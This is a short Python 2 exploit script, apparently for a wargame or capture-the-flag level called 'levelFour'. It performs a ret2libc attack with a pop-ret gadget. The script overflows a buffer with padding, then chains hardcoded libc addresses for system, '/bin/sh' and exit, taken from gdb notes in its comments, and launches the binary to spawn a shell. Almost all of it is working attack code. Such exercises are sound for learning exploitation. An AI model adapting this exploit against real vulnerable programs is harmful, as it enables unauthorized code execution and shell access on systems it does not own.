#!/usr/bin/env python
import os
import struct

# Ret2Libc with a little ROP

# System
# (gdb) p system
# $5 = {<text variable, no debug info>} 0xf7e0c980 <system>
system = struct.pack('I',0xf7e0c980)

# Exit
# (gdb) p exit
# $6 = {<text variable, no debug info>} 0xf7dff9b0 <exit>
exit = struct.pack('I',0xf7dff9b0)

# Shell
# Start Addr   End Addr       Size     Offset Objfile
# 0xf7dce000   0xf7de7000     0x19000  0x0    /usr/lib32/libc-2.28.so
#
# (gdb) x/s 0xf7dce000 + 0x17eaaa
# 0xf7f4caaa:	"/bin/sh"
shell_addr = struct.pack('I',0xf7f4caaa)

# pop->ret
# Start Addr   End Addr       Size     Offset Objfile
# 0xf7dce000   0xf7de7000     0x19000  0x0    /usr/lib32/libc-2.28.so
#
# Libc Gadget
# 1ad1a:       5f                      pop    %edi
# 1ad1b:       c3                      ret
#
# (gdb) x/2i 0xf7dce000 + 0x1ad1a
# 0xf7de8d1a:	pop    edi
# 0xf7de8d1b:	ret
pop_ret = struct.pack('I',0xf7de8d1a)

# Payload crafting
junk = 'A' * 24
write_ebp = 'B' * 4

# Debug: Crash prog by overwriting EIP with junk
# payload = junk + write_ebp + "CCCC"
payload = junk + write_ebp + system + pop_ret + shell_addr + exit
print payload

# Debug: GDB
filename = 'sploit'
with open(filename, 'w') as f:
	f.write(payload)

# Exploit execution
binary = './levelFour'
cmd = binary + ' ' + payload
os.system(cmd)
